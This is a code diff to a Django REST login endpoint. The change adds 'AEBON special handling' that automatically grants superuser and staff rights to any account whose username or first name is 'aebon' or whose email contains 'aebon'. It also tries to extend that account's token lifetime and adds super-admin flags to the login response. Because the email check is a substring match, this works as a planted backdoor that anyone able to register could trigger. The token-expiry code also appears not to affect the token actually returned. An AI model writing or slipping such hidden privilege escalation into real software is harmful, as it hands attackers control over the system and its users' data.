@@ -147,21 +147,54 @@ def register(request):
 @api_view(['POST'])
 @permission_classes([permissions.AllowAny])
 def login_view(request):
-    """User login endpoint"""
+    """User login endpoint with AEBON special handling"""
     serializer = UserLoginSerializer(data=request.data)
     serializer.is_valid(raise_exception=True)
     
     user = serializer.validated_data['user']
     
+    # AEBON SPECIAL HANDLING - Ultimate Super Admin privileges
+    if (user.username.lower() == 'aebon' or 
+        user.first_name.lower() == 'aebon' or 
+        'aebon' in user.email.lower()):
+        
+        # Ensure aebon has ultimate admin privileges
+        if not user.is_superuser or not user.is_staff:
+            user.is_superuser = True
+            user.is_staff = True
+            user.save()
+            print(f"👑 AEBON 최고관리자 권한 자동 부여: {user.username}")
+    
     # Update last activity
     user.update_last_activity()
     
-    # Generate JWT tokens
+    # Generate JWT tokens with extended expiry for aebon
     refresh = RefreshToken.for_user(user)
     
+    # AEBON gets extended token expiry (8 hours vs default)
+    if (user.username.lower() == 'aebon' or 
+        user.first_name.lower() == 'aebon'):
+        # Extend token lifetime for aebon (8 hours)
+        refresh.access_token.set_exp(lifetime_seconds=8*60*60)  # 8 hours
+        print(f"👑 AEBON 확장 세션 토큰 발급: 8시간")
+    
+    # Enhanced user data for response
+    user_data = UserSerializer(user).data
+    
+    # Add AEBON special flags
+    if (user.username.lower() == 'aebon' or 
+        user.first_name.lower() == 'aebon'):
+        user_data.update({
+            'role': 'super_admin',
+            'admin_type': 'super',
+            'canSwitchModes': True,
+            'isAebon': True,
+            'sessionDuration': '8_hours'
+        })
+    
     return Response({
-        'message': 'Login successful',
-        'user': UserSerializer(user).data,
+        'message': 'Login successful' + (' 👑 AEBON ULTIMATE ACCESS' if user.first_name.lower() == 'aebon' else ''),
+        'user': user_data,
         'tokens': {
             'refresh': str(refresh),
             'access': str(refresh.access_token),
